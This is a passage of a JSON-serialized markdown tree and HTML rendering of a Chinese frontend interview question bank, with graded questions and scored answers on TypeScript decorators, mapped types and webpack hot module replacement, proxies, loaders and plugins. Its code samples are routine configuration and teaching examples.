级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（6 分）\\n\\n","depth":4,"text":"解答（6 分）","tokens":[{"type":"text","raw":"解答（6 分）","text":"解答（6 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n- **4：** 常见的装饰器类型：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n\\n","task":false,"loose":true,"text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","tokens":[{"type":"text","raw":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。\\n","text":"**2：** 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","text":" 装饰器是一种特殊类型的声明，它能够被附加到类声明、方法、属性或参数上。装饰器使用 @expression 这种形式，expression求值后必须为一个函数，它会在运行时被调用。","escaped":false}]}]},{"type":"list_item","raw":"- **4：** 常见的装饰器类型：","task":false,"loose":true,"text":"**4：** 常见的装饰器类型：","tokens":[{"type":"text","raw":"**4：** 常见的装饰器类型：","text":"**4：** 常见的装饰器类型：","tokens":[{"type":"strong","raw":"**4：**","text":"4：","tokens":[{"type":"text","raw":"4：","text":"4：","escaped":false}]},{"type":"text","raw":" 常见的装饰器类型：","text":" 常见的装饰器类型：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution\\n```","lang":"typescript","text":"// 类装饰器\\nfunction classDecorator<T extends {new(...args:any[]):{}}>(constructor:T) {\\n    return class extends constructor {\\n        newProperty = \\"new property\\";\\n        hello = \\"override\\";\\n    }\\n}\\n\\n// 方法装饰器\\nfunction methodDecorator(target: any, propertyKey: string, descriptor: PropertyDescriptor) {\\n    // 保存原始方法\\n    const originalMethod = descriptor.value;\\n    \\n    // 修改方法的行为\\n    descriptor.value = function(...args: any[]) {\\n        console.log(\'Before method execution\');\\n        const result = originalMethod.apply(this, args);\\n        console.log(\'After method execution\');\\n        return result;\\n    }\\n}\\n\\n// 使用装饰器\\n@classDecorator\\nclass Example {\\n    @methodDecorator\\n    greet() {\\n        console.log(\'Hello!\');\\n    }\\n}\\n\\nconst e = new Example();\\ne.greet();\\n// 输出:\\n// Before method execution\\n// Hello!\\n// After method execution"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>\\n\\n","pre":false,"text":"</details>\\n\\n"},{"type":"heading","raw":"## TypeScript中的映射类型是什么？\\n\\n","depth":2,"text":"TypeScript中的映射类型是什么？","tokens":[{"type":"text","raw":"TypeScript中的映射类型是什么？","text":"TypeScript中的映射类型是什么？","escaped":false}]},{"type":"heading","raw":"#### 类型：`基础`\\n\\n","depth":4,"text":"类型：`基础`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`基础`","text":"基础"}]},{"type":"heading","raw":"#### 级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W1`、`W2`、`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W1`","text":"W1"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W2`","text":"W2"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"html","block":true,"raw":"<details>\\n\\n","pre":false,"text":"<details>\\n\\n"},{"type":"list","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n- **2：** 示例：","ordered":false,"start":"","loose":true,"items":[{"type":"list_item","raw":"- **2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n\\n","task":false,"loose":true,"text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","tokens":[{"type":"text","raw":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。\\n","text":"**2：** 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","text":" 映射类型允许你从一个旧类型创建一个新类型，其中新类型的每个属性都基于旧类型的属性进行转换。TypeScript内置了几个常用的映射类型。","escaped":false}]}]},{"type":"list_item","raw":"- **2：** 示例：","task":false,"loose":true,"text":"**2：** 示例：","tokens":[{"type":"text","raw":"**2：** 示例：","text":"**2：** 示例：","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]},{"type":"text","raw":" 示例：","text":" 示例：","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```typescript\\n// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }\\n```","lang":"typescript","text":"// 原始接口\\ninterface Person {\\n    name: string;\\n    age: number;\\n    address: string;\\n}\\n\\n// 将所有属性变为可选\\ntype PartialPerson = Partial<Person>;\\n// 等价于:\\n// {\\n//    name?: string;\\n//    age?: number;\\n//    address?: string;\\n// }\\n\\n// 将所有属性变为只读\\ntype ReadonlyPerson = Readonly<Person>;\\n// 等价于:\\n// {\\n//    readonly name: string;\\n//    readonly age: number;\\n//    readonly address: string;\\n// }\\n\\n// 自定义映射类型\\ntype Nullable<T> = {\\n    [P in keyof T]: T[P] | null;\\n};\\n\\n// 使用自定义映射类型\\ntype NullablePerson = Nullable<Person>;\\n// 等价于:\\n// {\\n//    name: string | null;\\n//    age: number | null;\\n//    address: string | null;\\n// }"},{"type":"space","raw":"\\n\\n"},{"type":"html","block":true,"raw":"</details>","pre":false,"text":"</details>"}]},{"key":"webpack","content":"<h1>webpack</h1>\\n<h2>webpack 的热更新是什么?</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong> Hot Module Replacement 简称 HRM</li>\\n<li><strong>1：</strong> 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用</li>\\n</ul>\\n<h2>webpack 中如何配置开启热更新？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong></li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const webpack = require(&quot;webpack&quot;);\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    // HMR\\n    hot: true,\\n    // hotOnly: true\\n  },\\n};\\n</code></pre>\\n<h2>webpack 的热更新原理?</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（4 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，</li>\\n<li><strong>1：</strong> 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。</li>\\n<li><strong>1：</strong> 由于 socket 服务器在 HMR Runtime 和 HMR Server 之间建立 websocket 链接，当文件发生改动的时候，服务端会向浏览器推送一条消息，消息包含文件改动后生成的 hash 值，如下图的h 属性，作为下一次热更细的标识</li>\\n<li><strong>1：</strong> 在浏览器接受到这条消息之前，浏览器已经在上一次 socket 消息中已经记住了此时的 hash 标识这时候我们会创建一个 ajax 去服务端请求获取到变化内容的 manifest 文件mainfest 文件包含重新 build 生成的 hash 值，以及变化的模块，对应上图的 c 属性浏览器根据 manifest 文件获取模块变化的内容，从而触发 render 流程，实现局部模块更新。\\n<img src=\\"/public/images/image.png\\" alt=\\"alt text\\"></li>\\n</ul>\\n<h2>简述webpack的构建流程？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 初始化流程：从配置文件和 Shell 语句中读取与合并参数，并初始化需要使用的插件和配置插件等执行环境所需要的参数</li>\\n<li><strong>1：</strong> 编译构建流程：从 Entry 发出，针对每个 Module 串行调用对应的 Loader 去翻译文件内容，再找.到该 Module 依赖的 Module，递归地进行编译处理</li>\\n<li><strong>1：</strong> 输出流程：对编译后的 Module 组合成 Chunk，把 Chunk 转换成文件，输出到文件系统\\n<img src=\\"/public/images/image2.png\\" alt=\\"alt text\\"></li>\\n</ul>\\n<h2>webpack proxy是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> webpack proxy，是 webpack 提供的代理服务，基本行为就是接收客户端发送的请求后转发给其他服务器，其目的是为了便于开发者在开发模式下解决跨域问题(浏览器安全策略限制)</li>\\n</ul>\\n<h2>webpack 中提供服务器的工具是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> webpack 中提供服务器的工具为 webpack-dev-server</li>\\n</ul>\\n<h2>webpack-dev-server是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> webpack-dev-server是官方推出的一款开发工具，将自动编译和自动刷新浏览器等一系列对开发友好的功能全部集成在了一起，目的是为了提高开发者日常的开发效率，只适用在开发阶段关于配置方面。</li>\\n</ul>\\n<h2>webpack代理怎么配置？proxy中常用的属性是什么？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>1：</strong> 配置如下：</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const path = require(&quot;path&quot;);\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    contentBase: path.join(__dirname, &quot;dist&quot;),\\n    compress: true,\\n    port: 9000,\\n    proxy: {\\n      &quot;/api&quot;: {\\n        target: &quot;https://api.github.com&quot;,// \\n      },\\n    },\\n    // ...\\n  },\\n};\\n</code></pre>\\n<ul>\\n<li><strong>2：</strong> 常用属性：</li>\\n</ul>\\n<blockquote>\\n<p>target：表示的是代理到的目标地址<br>pathRewrite：默认情况下，我们的 /api-hy 也会被写入到URL中，如果希望删除、可以使用pathRewrite<br>secure：默认情况下不接收转发到https的服务器上，如果希望支持，可以设置为false<br>changeOrigin：它表示是否更新代理后请求的 headers 中host地址  </p>\\n</blockquote>\\n<h2>proxy是工作原理？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（1 分）</h4>\\n<ul>\\n<li><strong>1：</strong> proxy 工作原理实质上是利用 http-proxy-middleware 这个 http 代理中间件，实现请求转发给其他服务器</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">const express = require(&#39;express&#39;);\\nconst proxy = require(&#39;http-proxy-middleware&#39;);\\nconst app = express();\\napp.use(&#39;/api&#39;, proxy({target: &#39;http://www.example.org&#39;, changeOrigin: true\\n}));\\napp.listen(3000);\\n</code></pre>\\n<h2>webpack proxy 为什么能解决跨域？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 在开发阶段，webpack-dev-server 会启动一个本地开发服务器，所以我们的应用在开发阶段是独立运行在 localhost 的一个端口上，而后端服务又是运行在另外一个地址上所以在开发阶段中，由于浏览器同源策略的原因，当本地访问后端就会出现跨域请求的问题通过设置 webpack proxy 实现代理请求后，相当于浏览器与服务端中添加一个代理者当本地发送请求的时候，\\n代理服务器响应该请求，并将请求转发到目标服务器，目标服务器响应数据后再将数据返回给代理服务器，最终再由代理服务器将数据响应给本地。<br>在代理服务器传递数据给本地浏览器的过程中，两者同源，并不存在跨域行为，这时候浏览器就能正常接收数据。<br><strong>注意：服务器与服务器之间请求数据并不会存在跨域行为，跨域行为是浏览器安全策略限制。</strong></li>\\n</ul>\\n<h2>webpack的loader是什么？为什么使用它？它有哪几种配置方式</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>1：</strong> loader 用于对模块的&quot;源代码&quot;进行转换，在 import 或&quot;加载&quot;模块时预处理文件</li>\\n<li><strong>1：</strong> webpack 做的事情，仅仅是分析出各种模块的依赖关系，然后形成资源列表，最终打包生成到指定的文件中。<br>在 webpack 内部中，任何文件都是模块，不仅仅只是js 文件。默认情况下，在遇到 import 或者 require 加载模块的时候，webpack 只支持对 js 和 json文件打包，像 css、 sass、 png 等这些类型的文件的时候，webpack 则无能为力，这时候就需要配置对应的 loader 进行文件内容的解析。</li>\\n<li><strong>3：</strong> 关于配置 loader 的方式有三种:<blockquote>\\n<p>配置方式(推荐)：在 webpack.config.js文件中指定 loader<br>内联方式：在每个 import 语句中显式指定 loader<br>Cl 方式：在 shell 命令中指定它们</p>\\n</blockquote>\\n</li>\\n</ul>\\n<h2>webpack的Plugin是什么</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> webpack 中的 plugin 赋予其各种灵活的功能，例如打包优化、资源管理、环境变量注入等，它们会运行在 webpack 的不同阶段(钩子/生命周期)，贯穿了 webpack 整个编译周期，目的在于解决 loader 无法实现的其他事</li>\\n</ul>\\n<h2>webpack的Plugin和Loader的区别</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>1：</strong>【Loader】：用于对模块源码的转换， loader可以将文件从不同的语言（如TypeScript）转换为JavaScript，或者将内联图像转换为data URL。比如说：CSS-Loader，Style-Loader等。</li>\\n<li><strong>1：</strong>【Plugin】：目的在于解决loader无法实现的其他事，从打包优化和压缩，到重新定义环境变量，功能强大到可以用来处理各种各样的任务。webpack提供了很多开箱即用的插件：CommonChunkPlugin主要用于提取第三方库和公共模块，避免首屏加载的bundle文件，或者按需加载的bundle文件体积过大，导致加载时间过长，是一把优化的利器。而在多页面应用中，更是能够为每个页面间的应用程序共享代码创建bundle。</li>\\n</ul>\\n<h2>webpack常见的提升构建速度的方法</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W3</code>、<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（2 分）</h4>\\n<ul>\\n<li><strong>2：</strong> 常见的有一下几种：</li>\\n</ul>\\n<blockquote>\\n<p>优化 loader 配置<br>合理使用 resolve.extensions<br>优化 resolve.modules<br>优化 resolve.alias<br>使用 DLLPlugin 插件<br>使用 cache-loader<br>terser 启动多线程<br>合理使用 sourceMap</p>\\n</blockquote>\\n<h2>webpack中的Loader如何编写？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>5：</strong> loader 的本质其本质为函数，函数中的 this 作为上下文会被 webpack 填充，因此我们不能将 loader 设为一个箭头函数。\\n函数接受一个参数，为 webpack 传递给 loader 的文件源内容函数中 this 是由 webpack 提供的对象，能够获取当前 loader 所需要的各种信息函数中有异步操作或同步操作，异步操作通过 this.callback 返回，返回值要求为 string 或者 Buffer。</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">//导出一个函数，source为webpack传递给loader的文件源内容\\nmodule.exports = function(source){\\n const content = doSomeThing2JsString(source);\\n//如果 loader 配置了 options 对象，那么this.query将指向 options\\nconst options = this.query;\\n// 可以用作解析其他模块路径的上下文\\nconsole.log(&#39;this.context&#39;);\\n/*\\n* this.callback 参数:\\n* error:Error |null，当 loader 出错时向外抛出一个 error\\n* content:String | Buffer，经过 loader 编译后需要导出的内容\\n* sourceMap:为方便调试生成的编译后内容的 source map* ast:本次编译生成的 AST 静态语法树，之后执行的 loader 可以直接使用这个 AST.进而省去重复生成 AST 的过程\\n*/\\nthis.callback(null，content);//异步\\nreturn content;//同步\\n}\\n</code></pre>\\n<h2>webpack中的Plugin如何编写？</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（5 分）</h4>\\n<ul>\\n<li><strong>5：</strong> 由于 webpack 基于发布订阅模式，在运行的生命周期中会广播出许多事件，插件通过监听这些事件就可以在特定的阶段执行自己的插件任务<br>webpack 编译会创建两个核心对象:</li>\\n<li>compiler:包含了 webpack 环境的所有的配置信息，包括 options，loader 和 plugin，和webpack 整个生命周期相关的钩子</li>\\n<li>compilation:作为 plugin 内置事件回调函数的参数，包含了当前的模块资源、编译生成资源、变化的文件以及被跟踪依赖的状态信息。当检测到一个文件变化，一次新的 Compilation<br>将被创建如果自己要实现 plugin ，也需要遵循一定的规范:</li>\\n<li>插件必须是一个函数或者是一个包含 apply 方法的对象，这样才能访问 compiler 实例.</li>\\n<li>传给每个插件的 compiler 和compilation 对象都是同一个引用，因此不建议修改</li>\\n<li>异步的事件需要在插件处理完任务时调用回调函数通知 webpack 进入下一个流程，不然会卡住</li>\\n</ul>\\n<pre><code class=\\"language-javascript\\">class MyPlugin {\\n  // Webpack 会调用 MyPlugin 实例的 apply 方法给插件实例传入 compiler 对象\\n  apply(compiler) {\\n    //找到合适的事件钩子，实现自己的插件功能\\n    compiler.hooks.emit.tap(&quot;MyPlugin&quot;, (compilation) =&gt; {\\n      // compilation: 当前打包构建流程的上下文\\n      console.log(compilation);\\n      // do something...\\n    });\\n  }\\n}\\n</code></pre>\\n<h2>说说如何借助webpack来优化前端性能?</h2>\\n<h4>类型：<code>架构</code></h4>\\n<h4>级别：<code>w3</code>,<code>W4</code>、<code>W5</code>、<code>W6</code></h4>\\n<h4>解答（3 分）</h4>\\n<ul>\\n<li><strong>3：</strong></li>\\n</ul>\\n<blockquote>\\n<p>JS代码压缩<br>CSS代码压缩<br>Html文件代码压缩<br>文件大小压缩<br>图片压缩<br>Tree Shaking<br>代码分离<br>内联 chunk</p>\\n</blockquote>\\n","ast":[{"type":"heading","raw":"# webpack\\n\\n","depth":1,"text":"webpack","tokens":[{"type":"text","raw":"webpack","text":"webpack","escaped":false}]},{"type":"heading","raw":"## webpack 的热更新是什么?\\n\\n","depth":2,"text":"webpack 的热更新是什么?","tokens":[{"type":"text","raw":"webpack 的热更新是什么?","text":"webpack 的热更新是什么?","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **1：** Hot Module Replacement 简称 HRM\\n- **1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **1：** Hot Module Replacement 简称 HRM\\n","task":false,"loose":false,"text":"**1：** Hot Module Replacement 简称 HRM","tokens":[{"type":"text","raw":"**1：** Hot Module Replacement 简称 HRM","text":"**1：** Hot Module Replacement 简称 HRM","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" Hot Module Replacement 简称 HRM","text":" Hot Module Replacement 简称 HRM","escaped":false}]}]},{"type":"list_item","raw":"- **1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","task":false,"loose":false,"text":"**1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","tokens":[{"type":"text","raw":"**1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","text":"**1：** 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","tokens":[{"type":"strong","raw":"**1：**","text":"1：","tokens":[{"type":"text","raw":"1：","text":"1：","escaped":false}]},{"type":"text","raw":" 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","text":" 模块热替换，指在应用程序运行过程中，替换、添加、删除模块，而无需重新刷新整个应用","escaped":false}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack 中如何配置开启热更新？\\n\\n","depth":2,"text":"webpack 中如何配置开启热更新？","tokens":[{"type":"text","raw":"webpack 中如何配置开启热更新？","text":"webpack 中如何配置开启热更新？","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（2 分）\\n\\n","depth":4,"text":"解答（2 分）","tokens":[{"type":"text","raw":"解答（2 分）","text":"解答（2 分）","escaped":false}]},{"type":"list","raw":"- **2：**","ordered":false,"start":"","loose":false,"items":[{"type":"list_item","raw":"- **2：**","task":false,"loose":false,"text":"**2：**","tokens":[{"type":"text","raw":"**2：**","text":"**2：**","tokens":[{"type":"strong","raw":"**2：**","text":"2：","tokens":[{"type":"text","raw":"2：","text":"2：","escaped":false}]}]}]}]},{"type":"space","raw":"\\n\\n"},{"type":"code","raw":"```javascript\\nconst webpack = require(\\"webpack\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    // HMR\\n    hot: true,\\n    // hotOnly: true\\n  },\\n};\\n```","lang":"javascript","text":"const webpack = require(\\"webpack\\");\\nmodule.exports = {\\n  // ...\\n  devServer: {\\n    // HMR\\n    hot: true,\\n    // hotOnly: true\\n  },\\n};"},{"type":"space","raw":"\\n\\n"},{"type":"heading","raw":"## webpack 的热更新原理?\\n\\n","depth":2,"text":"webpack 的热更新原理?","tokens":[{"type":"text","raw":"webpack 的热更新原理?","text":"webpack 的热更新原理?","escaped":false}]},{"type":"heading","raw":"#### 类型：`架构`\\n\\n","depth":4,"text":"类型：`架构`","tokens":[{"type":"text","raw":"类型：","text":"类型：","escaped":false},{"type":"codespan","raw":"`架构`","text":"架构"}]},{"type":"heading","raw":"#### 级别：`W3`、`W4`、`W5`、`W6`\\n\\n","depth":4,"text":"级别：`W3`、`W4`、`W5`、`W6`","tokens":[{"type":"text","raw":"级别：","text":"级别：","escaped":false},{"type":"codespan","raw":"`W3`","text":"W3"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W4`","text":"W4"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W5`","text":"W5"},{"type":"text","raw":"、","text":"、","escaped":false},{"type":"codespan","raw":"`W6`","text":"W6"}]},{"type":"heading","raw":"#### 解答（4 分）\\n\\n","depth":4,"text":"解答（4 分）","tokens":[{"type":"text","raw":"解答（4 分）","text":"解答（4 分）","escaped":false}]},{"type":"list","raw":"- **1：** 在编写未经过 webpack 打包的源代码后，Webpack Compile 将源代码和 HMR Runtime 一起编译成 bundle 文件，传输给 Bundle Server 静态资源服务器，\\n- **1：** 当某一个文件或者模块发生变化时，webpack 监听到文件变化对文件重新编译打包，编译生成唯一的hash 值，这个 hash 值用来作为下一次热更新的标识根据变化的内容生成两个补丁文件: manifest (包含了 hash 和 chundId ，用来说明变化的内容)和 chunk.js 模块。\\n- **1：** 由于 socket 服务器在 HMR Runtime 和 